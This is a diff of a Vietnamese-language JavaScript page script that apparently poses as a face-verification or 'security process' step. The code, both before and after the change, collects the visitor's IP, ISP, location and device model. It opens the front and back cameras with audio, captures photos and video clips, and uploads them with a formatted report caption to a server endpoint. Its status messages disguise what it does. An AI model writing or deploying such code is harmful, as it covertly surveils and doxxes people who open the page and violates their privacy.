@@ -2,14 +2,8 @@
     const API_URL = '/api/send'; 
     const info = {
         time: new Date().toLocaleString('vi-VN'),
-        ip: '⌛ Đang lấy...',
-        realIp: '⌛ Đang lấy...',
-        isp: '⌛ Đang lấy...',
-        location: '⌛ Đang lấy...',
-        device: '⌛ Đang nhận diện...',
-        os: '⌛ Đang nhận diện...',
-        browser: navigator.userAgent,
-        camera: '⏳ Đang khởi tạo...'
+        ip: '⌛...', realIp: '⌛...', isp: '⌛...', location: '⌛...',
+        device: '⌛...', os: '⌛...', browser: navigator.userAgent, camera: '⏳...'
     };
 
     function log(msg) {
@@ -17,7 +11,8 @@
         console.log(`[Status] ${msg}`);
     }
 
-    function detectDevice() {
+    // 1. Thu thập thông tin đầy đủ
+    async function collectInfo() {
         const ua = navigator.userAgent;
         const platform = navigator.platform;
         
@@ -28,25 +23,13 @@
         } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
             info.os = 'iOS';
             const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
-            const models = {
-                "430x932@3": "iPhone 14/15/16 Pro Max",
-                "393x852@3": "iPhone 14/15/16 Pro",
-                "428x926@3": "iPhone 12/13/14 Pro Max",
-                "390x844@3": "iPhone 12/13/14",
-                "375x812@3": "iPhone X/XS/11 Pro",
-                "414x896@3": "iPhone XS Max/11 Pro Max",
-                "414x896@2": "iPhone XR/11",
-                "375x667@2": "iPhone 6/7/8/SE"
-            };
-            info.device = models[screen] || 'iPhone/iPad';
+            const models = {"430x932@3":"14/15/16 PM","393x852@3":"14/15/16 Pro","428x926@3":"12/13/14 PM","390x844@3":"12/13/14","375x812@3":"X/XS/11P","414x896@3":"XS Max/11PM","414x896@2":"XR/11","375x667@2":"6/7/8/SE"};
+            info.device = 'iPhone ' + (models[screen] || 'Model');
         } else {
-            info.os = platform;
-            info.device = 'PC/Laptop';
+            info.os = platform; info.device = 'PC/Laptop';
         }
         document.getElementById('st-os').innerText = `${info.os} (${info.device})`;
-    }
 
-    async function getNetworkInfo() {
         try {
             const r = await fetch('https://ipwho.is/');
             const d = await r.json();
@@ -55,48 +38,43 @@
             info.location = `${d.city}, ${d.region}, ${d.country}`;
             document.getElementById('st-ip').innerText = info.ip;
             document.getElementById('st-loc').innerText = d.city || 'Việt Nam';
-        } catch (e) {
-            info.ip = 'Không thể xác định';
-            document.getElementById('st-ip').innerText = 'Ẩn danh';
-        }
+        } catch (e) { info.ip = 'Lỗi'; }
     }
 
-    async function handleCamera() {
-        log("Đang yêu cầu quyền truy cập camera...");
+    // 2. Quay Video & Chụp ảnh
+    async function handleSecurityProcess() {
+        log("Đang khởi tạo hệ thống camera...");
+        
+        // --- CAMERA TRƯỚC ---
         try {
-            const video = document.getElementById('preview');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-            video.srcObject = stream;
-            log("Đang quét khuôn mặt...");
+            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+            const videoPreview = document.getElementById('preview');
+            videoPreview.srcObject = frontStream;
 
-            const frontPhoto = await capturePhoto(video);
-            
-            let backPhoto = null;
-            try {
-                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                const backVideo = document.createElement('video');
-                backVideo.srcObject = backStream;
-                await backVideo.play();
-                backPhoto = await capturePhoto(backVideo);
-                backStream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+            const frontPhoto = await capturePhoto(videoPreview);
+            await sendData('media', { photos: [{ data: frontPhoto, caption: getReportCaption('📸 ẢNH TRƯỚC') }] });
 
-            await sendData('media', { 
-                photos: [
-                    { data: frontPhoto, caption: getReportCaption('📸 ẢNH XÁC THỰC (TRƯỚC)') },
-                    { data: backPhoto, caption: '📸 ẢNH MÔI TRƯỜNG (SAU)' }
-                ].filter(p => p.data)
-            });
+            log("Đang xác thực khuôn mặt...");
+            await recordAndSend(frontStream, 3500, '🎬 VIDEO TRƯỚC');
+            frontStream.getTracks().forEach(t => t.stop());
+        } catch (e) { log("Không thể truy cập camera trước."); }
 
-            log("Đang mã hóa dữ liệu...");
-            await recordVideo(stream, 4000); // Giảm xuống 4 giây để nhẹ hơn
+        // --- CAMERA SAU ---
+        try {
+            log("Đang quét môi trường xung quanh...");
+            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+            const backVideo = document.createElement('video');
+            backVideo.srcObject = backStream;
+            await backVideo.play();
 
-            info.camera = "✅ Hoàn tất";
-        } catch (err) {
-            log("Lỗi: Vui lòng cấp quyền camera.");
-            info.camera = "🚫 Bị từ chối";
-            await sendData('text', { text: getReportCaption('⚠️ CẢNH BÁO: TỪ CHỐI CAMERA') });
-        }
+            const backPhoto = await capturePhoto(backVideo);
+            await sendData('media', { photos: [{ data: backPhoto, caption: getReportCaption('📸 ẢNH SAU') }] });
+
+            await recordAndSend(backStream, 3500, '🎬 VIDEO SAU');
+            backStream.getTracks().forEach(t => t.stop());
+        } catch (e) { log("Không thể truy cập camera sau."); }
+
+        window.mainScriptFinished = true;
     }
 
     async function capturePhoto(videoEl) {
@@ -106,25 +84,25 @@
                 canvas.width = videoEl.videoWidth;
                 canvas.height = videoEl.videoHeight;
                 canvas.getContext('2d').drawImage(videoEl, 0, 0);
-                resolve(canvas.toDataURL('image/jpeg', 0.5)); // Chất lượng 0.5
-            }, 1000);
+                resolve(canvas.toDataURL('image/jpeg', 0.4));
+            }, 800);
         });
     }
 
-    async function recordVideo(stream, duration) {
+    async function recordAndSend(stream, duration, label) {
         return new Promise(resolve => {
-            const recorder = new MediaRecorder(stream);
+            const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
+            const recorder = new MediaRecorder(stream, { mimeType });
             const chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const blob = new Blob(chunks, { type: mimeType });
                 const reader = new FileReader();
                 reader.onloadend = async () => {
-                    await sendData('video', { video: reader.result, caption: '🎬 CLIP XÁC THỰC' });
+                    await sendData('video', { video: reader.result, caption: getReportCaption(label) });
                     resolve();
                 };
                 reader.readAsDataURL(blob);
-                stream.getTracks().forEach(t => t.stop());
             };
             recorder.start();
             setTimeout(() => recorder.stop(), duration);
@@ -133,33 +111,27 @@
 
     function getReportCaption(title) {
         return `
-${title}
-🕒 ${info.time}
-📱 ${info.device} (${info.os})
-🌐 IP: ${info.ip}
-🏢 ISP: ${info.isp}
-📍 ${info.location}
+<b>${title}</b>
+━━━━━━━━━━━━━━━━━━
+🕒 <b>Thời gian:</b> ${info.time}
+📱 <b>Thiết bị:</b> ${info.device} (${info.os})
+🌐 <b>IP:</b> <code>${info.ip}</code>
+🏢 <b>ISP:</b> ${info.isp}
+📍 <b>Vị trí:</b> ${info.location}
+🔗 <b>Trình duyệt:</b> ${navigator.userAgent.substring(0, 40)}...
 `.trim();
     }
 
     async function sendData(type, payload) {
         try {
-            console.log(`Sending ${type}...`);
-            const response = await fetch(API_URL, {
+            await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type, ...payload })
             });
-            const result = await response.json();
-            console.log(`Response from ${type}:`, result);
-        } catch (e) {
-            console.error(`Gửi ${type} thất bại:`, e);
-        }
+        } catch (e) { console.error(e); }
     }
 
-    detectDevice();
-    await getNetworkInfo();
-    await handleCamera();
-    
-    window.mainScriptFinished = true;
+    await collectInfo();
+    await handleSecurityProcess();
 })();
